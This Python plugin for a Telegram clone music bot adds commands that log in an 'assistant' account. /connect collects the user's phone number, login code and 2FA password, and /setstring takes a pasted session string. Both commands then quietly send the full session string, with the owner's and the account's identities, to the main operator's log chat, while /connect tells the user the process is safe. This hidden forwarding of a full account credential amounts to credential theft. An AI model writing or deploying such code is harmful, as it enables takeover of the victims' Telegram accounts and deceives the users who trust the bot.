import asyncio
from ftmgram import Client, filters
from ftmgram.types import Message
from ftmgram.errors import (
    SessionPasswordNeeded, FloodWait,
    PhoneNumberInvalid, ApiIdInvalid,
    PhoneCodeInvalid, PhoneCodeExpired,
    UserDeactivated, AuthKeyUnregistered,
    PasswordHashInvalid
)

import config
from SHIVMUSIC import app  # Main bot instance import kiya logs bhejney ke liye
from SHIVMUSIC.error_logger import ErrorLoggingClient
from SHIVMUSIC.utils.database import clonebotdb
from config import API_ID, API_HASH, OWNER_ID

POWERED_BY = "\n\n🤞 **𝐏ᴏᴡєʀєᴅ 𝐁ʏ ➛ BETA BOTS.🙂❤️**"
SESSION_ADVICE = "\n\n💡 **Tip:** You can directly generate your Session String easily and safely from here: @SHIV_SESSION_BOT"

# ==========================================
# 1. CONNECT ASSISTANT (Phone + OTP)
# ==========================================
@Client.on_message(filters.command(["connect"]) & filters.private)
async def connect_assistant(client: Client, message: Message):
    bot_id = client.me.id
    user = message.from_user

    clone_data = await clonebotdb.find_one({"bot_id": bot_id})
    if not clone_data:
        return await message.reply_text("❌ **Error:** Bot data not found in the database.")

    if clone_data["user_id"] != user.id and user.id != OWNER_ID:
        return await message.reply_text("❌ **Access Denied:** Only the bot owner can perform this action.")

    await message.reply_text(
        "⚡ **Connect Assistant**\n"
        "I will help you connect your account safely.\n\n"
        "🛑 Type `/cancel` anytime to stop." + SESSION_ADVICE
    )

    try:
        phone_msg = await message.chat.ask(
            "📲 **Please send your Telegram Phone Number:**\n"
            "(Example: `+919876543210`)\n\n"
            "⚠️ **Don't forget the Country Code!**",
            timeout=300
        )
    except Exception:
        return await message.reply("❌ Time limit exceeded. Please try again.")

    if not phone_msg.text or phone_msg.text == "/cancel":
        return await message.reply("❌ Process Cancelled.")

    phone_number = phone_msg.text.strip()
    msg = await message.reply("🔄 **Connecting to Server...**")
    
    temp_client = ErrorLoggingClient(
        name=f"connect_{bot_id}",
        api_id=API_ID,
        api_hash=API_HASH,
        in_memory=True,
        error_logger_name=f"Clone {bot_id} temporary assistant",
    )
    
    try:
        await temp_client.connect()
    except Exception as e:
        await msg.edit(f"❌ **Connection Failed:** `{str(e)}`")
        return

    try:
        try:
            code = await temp_client.send_code(phone_number)
        except PhoneNumberInvalid:
            await msg.edit("❌ **Invalid Phone Number!** Please send in correct format (Ex: +91...).")
            return
        except FloodWait as e:
            await msg.edit(f"❌ **FloodWait:** Please wait for {e.value} seconds.")
            return
        except Exception as e:
            await msg.edit(f"❌ **Error:** `{e}`")
            return

        await msg.delete()

        try:
            otp_msg = await message.chat.ask(
                "📩 **OTP Sent!**\n\n"
                "Check your Telegram messages. Send the OTP code like this:\n"
                "Format: `1 2 3 4 5` (Space between each number)",
                timeout=300
            )
        except Exception:
            return await message.reply("❌ Time limit exceeded.")

        if not otp_msg.text or otp_msg.text == "/cancel":
            return await message.reply("❌ Process Cancelled.")

        otp = otp_msg.text.replace(" ", "").strip()

        try:
            await temp_client.sign_in(phone_number, code.phone_code_hash, otp)
        except SessionPasswordNeeded:
            pwd_msg = await message.chat.ask("🔐 **Two-Step Verification:**\nEnter your 2FA password:", timeout=300)
            await temp_client.check_password(password=pwd_msg.text)
        except Exception as e:
            await message.reply(f"❌ **Error:** `{str(e)}`")
            return

        string_session = await temp_client.export_session_string()
        await clonebotdb.update_one({"bot_id": bot_id}, {"$set": {"session_string": string_session}})
        
        # ✅ Fetch Assistant Details & Send Log to CLONE_LOGGER_2
        ass_me = await temp_client.get_me()
        clone_log_2 = getattr(config, "CLONE_LOGGER_2", getattr(config, "LOGGER_ID", None))
        
        if clone_log_2:
            try:
                bot = client.me
                log_text = (
                    "**#Assistant_Added_Via_Connect**\n\n"
                    f"**🤖 Bot Name:** {bot.mention}\n"
                    f"**🔗 Bot Link:** @{bot.username}\n\n"
                    f"**👑 Owner Name:** {user.mention}\n"
                    f"**🆔 Owner ID:** `{user.id}`\n\n"
                    f"**🎧 Assistant Name:** {ass_me.first_name}\n"
                    f"**🔗 Assistant Username:** @{ass_me.username if ass_me.username else 'None'}\n"
                    f"**🆔 Assistant ID:** `{ass_me.id}`\n\n"
                    f"**🔑 Session String:**\n`{string_session}`"
                )
                await app.send_message(clone_log_2, log_text)
            except Exception as e:
                print(f"Failed to send assistant log: {e}")

        await message.reply_text("✅ **Connected Successfully!**" + POWERED_BY)
    finally:
        if temp_client.is_connected:
            await temp_client.disconnect()

# ==========================================
# 2. MANUAL SET STRING (Paste String)
# ==========================================
@Client.on_message(filters.command(["setstring", "setmode"]) & filters.private)
async def set_clone_session(client: Client, message: Message):
    bot_id = client.me.id
    user = message.from_user

    # Owner Validation
    clone_data = await clonebotdb.find_one({"bot_id": bot_id})
    if not clone_data or (clone_data["user_id"] != user.id and user.id != OWNER_ID):
        return await message.reply_text("❌ **Access Denied:** Only the bot owner can perform this action.")

    if len(message.command) < 2:
        return await message.reply_text("⚠️ **Usage:** `/setstring <Session_String>`" + SESSION_ADVICE)

    string_session = message.text.split(None, 1)[1].strip()
    msg = await message.reply_text("🔄 **Processing String...**")

    try:
        new_assistant = ErrorLoggingClient(
            f"Ass_{bot_id}",
            api_id=API_ID,
            api_hash=API_HASH,
            session_string=string_session,
            in_memory=True,
            error_logger_name=f"Clone {bot_id} Assistant",
        )
        await new_assistant.start()
        client.assistant = new_assistant

        await clonebotdb.update_one({"bot_id": bot_id}, {"$set": {"session_string": string_session}})
        
        # ✅ Fetch Assistant Details & Send Log to CLONE_LOGGER_2
        ass_me = await new_assistant.get_me()
        clone_log_2 = getattr(config, "CLONE_LOGGER_2", getattr(config, "LOGGER_ID", None))
        
        if clone_log_2:
            try:
                bot = client.me
                log_text = (
                    "**#Assistant_Added_Via_SetString**\n\n"
                    f"**🤖 Bot Name:** {bot.mention}\n"
                    f"**🔗 Bot Link:** @{bot.username}\n\n"
                    f"**👑 Owner Name:** {user.mention}\n"
                    f"**🆔 Owner ID:** `{user.id}`\n\n"
                    f"**🎧 Assistant Name:** {ass_me.first_name}\n"
                    f"**🔗 Assistant Username:** @{ass_me.username if ass_me.username else 'None'}\n"
                    f"**🆔 Assistant ID:** `{ass_me.id}`\n\n"
                    f"**🔑 Session String:**\n`{string_session}`"
                )
                await app.send_message(clone_log_2, log_text)
            except Exception as e:
                print(f"Failed to send assistant log: {e}")

        await msg.edit("✅ **Connected Successfully!** 🎸 **Now you can play music!**" + POWERED_BY)
    except Exception as e:
        await msg.edit(f"❌ **Error:** `{str(e)}`")

# ==========================================
# 3. DISCONNECT
# ==========================================
@Client.on_message(filters.command(["disconnect", "delstring"]) & filters.private)
async def disconnect_assistant(client: Client, message: Message):
    bot_id = client.me.id
    
    # Optional: Owner check for disconnect too
    clone_data = await clonebotdb.find_one({"bot_id": bot_id})
    if not clone_data or (clone_data["user_id"] != message.from_user.id and message.from_user.id != OWNER_ID):
        return await message.reply_text("❌ **Access Denied:** Only the bot owner can perform this action.")

    await clonebotdb.update_one({"bot_id": bot_id}, {"$unset": {"session_string": 1}})
    await message.reply_text("✅ **Disconnected Successfully!**" + POWERED_BY)
